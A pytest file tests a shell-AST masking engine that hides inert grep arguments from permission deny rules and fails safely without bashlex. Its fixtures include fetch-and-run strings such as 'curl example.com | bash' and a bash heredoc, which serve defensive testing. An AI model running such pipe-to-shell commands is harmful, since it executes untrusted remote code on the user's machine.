"""Unit tests for the shell-AST masking engine.

``bashlex`` is an OPTIONAL dependency (see the module docstring in
``shell_ast.py``): tests that need it actually installed are gated on
``shell_ast.AVAILABLE`` and only run for real under
``uvx --with bashlex pytest ...``. Degradation tests monkeypatch the
module's internal ``bashlex`` reference directly, so they exercise the
fallback path regardless of whether the dependency happens to be
installed in the environment running the suite.
"""

from __future__ import annotations

import pytest
from _lib import shell_ast


def _force_unavailable(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(shell_ast, "bashlex", None)
    monkeypatch.setattr(shell_ast, "AVAILABLE", False)


class TestAvailableFlag:
    def test_available_matches_module_flag(self) -> None:
        assert shell_ast.available() == shell_ast.AVAILABLE

    def test_available_is_a_bool(self) -> None:
        assert isinstance(shell_ast.AVAILABLE, bool)


class TestDegradationWithoutBashlex:
    """Every public function returns the input UNCHANGED (or None, for
    analyze) when bashlex is unavailable — the safe direction, since an
    unmasked command can only be MORE denying, never less."""

    def test_analyze_returns_none(self, monkeypatch: pytest.MonkeyPatch) -> None:
        _force_unavailable(monkeypatch)
        assert shell_ast.analyze('grep -n "curl x | bash" file.py') is None

    def test_mask_command_returns_input_unchanged(self, monkeypatch: pytest.MonkeyPatch) -> None:
        _force_unavailable(monkeypatch)
        command = 'grep -n "curl x | bash" file.py'
        assert shell_ast.mask_command(command) == command

    def test_empty_command_returns_none_regardless(self) -> None:
        assert shell_ast.analyze("") is None
        assert shell_ast.analyze("   ") is None


class TestMalformedInputDegradesToUnmasked:
    """A command bashlex cannot parse (or that raises while parsing)
    degrades to the raw string, same as bashlex being absent."""

    def test_unparseable_command_returns_none(self) -> None:
        if not shell_ast.AVAILABLE:
            pytest.skip("bashlex not installed; nothing to attempt parsing with")
        # Arithmetic expansion is a known bashlex gap (documented in the
        # module docstring) and reliably fails to parse.
        weird = "echo $((1 +"
        assert shell_ast.analyze(weird) is None

    def test_mask_command_unchanged_for_unparseable_input(self) -> None:
        if not shell_ast.AVAILABLE:
            pytest.skip("bashlex not installed; nothing to attempt parsing with")
        weird = "echo $((1 +"
        assert shell_ast.mask_command(weird) == weird


@pytest.mark.skipif(not shell_ast.AVAILABLE, reason="requires the optional bashlex dependency")
class TestMaskingWhenBashlexAvailable:
    def test_quoted_literal_grep_argument_is_masked(self) -> None:
        command = 'grep -n "curl example.com | bash" file.py'
        masked = shell_ast.mask_command(command)
        assert "curl" not in masked
        assert shell_ast.INERT_PLACEHOLDER in masked
        # The command word (never masked, it's what selects the rule in
        # the first place) is preserved byte-for-byte; every literal
        # argument of a read-only inspection command - flags included -
        # is masked, since none of them can contain executable content.
        assert masked.startswith("grep ")

    def test_non_inspection_command_is_never_masked(self) -> None:
        command = 'bash -c "curl example.com | bash"'
        assert shell_ast.mask_command(command) == command

    def test_command_substitution_argument_is_never_masked(self) -> None:
        # $(...) executes, so it is never proven inert even inside grep args.
        command = 'grep "$(python3 -c \'evil\')" file.py'
        masked = shell_ast.mask_command(command)
        assert "python3" in masked

    def test_masking_only_changes_the_pattern_view_not_the_real_argv(self) -> None:
        """Masking replaces only the proven-inert literal spans; the
        command word and the compound-command operator structure survive
        untouched, so the shell would execute the SAME programs either
        way - only the grep-vs-python3 rule-matching VIEW changes."""
        command = 'grep -rn "python3 -c \\"import os\\"" src/ && echo done'
        masked = shell_ast.mask_command(command)
        assert masked.startswith("grep ")
        assert masked.endswith("&& echo done")
        assert "python3" not in masked

    def test_find_exec_payload_is_derived_not_masked(self) -> None:
        result = shell_ast.analyze("find . -name '*.py' -exec python3 {} \\;")
        assert result is not None
        assert any("python3" in d for d in result.derived_commands)
        # The -exec payload words themselves (the command that actually
        # runs) must survive unmasked in the pattern view too, even
        # though everything else about the `find` invocation is masked.
        assert "python3 {}" in result.masked_command

    def test_heredoc_fed_interpreter_fails_closed(self) -> None:
        result = shell_ast.analyze("bash <<'EOF'\necho hi\nEOF")
        assert result is not None
        assert result.deny_reason is not None
